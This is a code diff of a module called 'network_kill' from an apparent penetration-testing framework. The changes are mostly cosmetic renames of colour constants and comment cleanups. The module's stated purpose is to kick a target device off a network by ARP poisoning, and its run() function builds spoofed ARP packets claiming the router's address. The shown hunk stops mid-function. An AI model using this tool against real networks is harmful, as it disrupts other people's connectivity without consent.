@@ -8,21 +8,21 @@ from time import sleep
 import logging
 from scapy.all import *
 from collections import OrderedDict
-from core import bcolors
+from core import colors
 from core import network_scanner
 
-#info about module
+# Info about the module
 #modules name
-modulename = "network_kill"
+name = "network_kill"
 #version
 version = "1.0"
-#description
+# Description
 desc = "kicks out target device from network with arp calls"
 #created by
 createdby = "4shadoww"
-#creator's github
+# Creator's github
 github = "4shadoww"
-#email
+# Email
 email = "4shadoww0@gmail.com"
 
 needroot = 1
@@ -33,19 +33,19 @@ variables = OrderedDict((
 ('router', '192.168.1.1'),
 ))
 
-#description for variables
+# Description for variables
 vdesc = [
 "target device's ip",
 "router's ip",
 ]
 
-#help for customcommands (remove if you will not use customcommands)
+# Help for the custom commands (remove if you will not use custom commands)
 mhelp = OrderedDict((
 ('scan', 'scan for targets'),
 ))
 
-#additional help notes
-help_notes = bcolors.WARNING+"this module will not work without root permission!\n this will not work alway because some devices can refuse from arp request!"+bcolors.END
+# Additional help notes
+help_notes = colors.red+"this module will not work without root permission!\n this will not work alway because some devices can refuse from arp request!"+colors.end
 
 #custom commands
 customcommands = (
@@ -56,8 +56,8 @@ customcommands = (
 changelog = "Version 1.0:\nrelease"
 
 def run():
-	print(bcolors.OKBLUE + "[*] arp poisoning has been started!" + bcolors.END)
-	print(bcolors.OKBLUE + "[*] ctrl + c to end" + bcolors.END)
+	print(colors.blue + "[*] arp poisoning has been started!" + colors.end)
+	print(colors.blue + "[*] ctrl + c to end" + colors.end)
 	packet = ARP()
 	packet.psrc = variables['router']
 	packet.pdst = variables['target']
